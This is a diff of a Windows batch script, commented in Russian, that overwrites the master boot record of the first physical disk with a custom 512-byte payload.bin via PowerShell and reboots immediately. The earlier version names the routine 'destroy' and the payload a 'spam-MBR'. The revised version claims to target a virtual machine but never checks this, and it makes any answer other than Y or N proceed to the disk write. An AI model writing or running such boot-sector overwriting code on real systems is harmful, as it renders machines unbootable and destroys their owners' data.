@@ -5,30 +5,25 @@ chcp 65001 > nul
 :: Проверка прав администратора
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo Запусти скрипт от имени Администратора!
+    echo [!] Запусти этот скрипт от имени Администратора!
     pause
     exit
 )
 
-:ask
 echo ===================================================
-set /p "choice=ЗАПИСАТЬ АССЕМБЛЕРНЫЙ SPAM-MBR И ПЕРЕЗАГРУЗИТЬ? (Y/N): "
+echo   ВНИМАНИЕ: Запись кастомного MBR в виртуальной машине!
 echo ===================================================
+set /p "choice=Прошить payload.bin в MBR и перезагрузить? (Y/N): "
 
-if /i "%choice%"=="Y" goto destroy
-if /i "%choice%"=="N" goto cancel
-goto ask
+if /i "%choice%"=="Y" goto flash
+if /i "%choice%"=="N" exit
+goto flash
 
-:cancel
-echo Отмена.
-pause
-exit
+:flash
+echo Запись бинарника в MBR...
 
-:destroy
-echo Запись бинарного кода спама в MBR...
-
-:: PowerShell читает готовый 512-байтовый бинарник payload.bin и зашивает в MBR
+:: Запись ровно 512 байт из payload.bin в PhysicalDrive0 через PowerShell
 powershell -Command "$bytes = [System.IO.File]::ReadAllBytes('payload.bin'); $stream = [io.file]::OpenWrite('\\.\PhysicalDrive0'); $stream.Write($bytes, 0, 512); $stream.Close();"
 
-:: Мгновенный reboot для демонстрации эффекта
+echo Готово! Перезагрузка виртуальной машины...
 shutdown /r /t 0
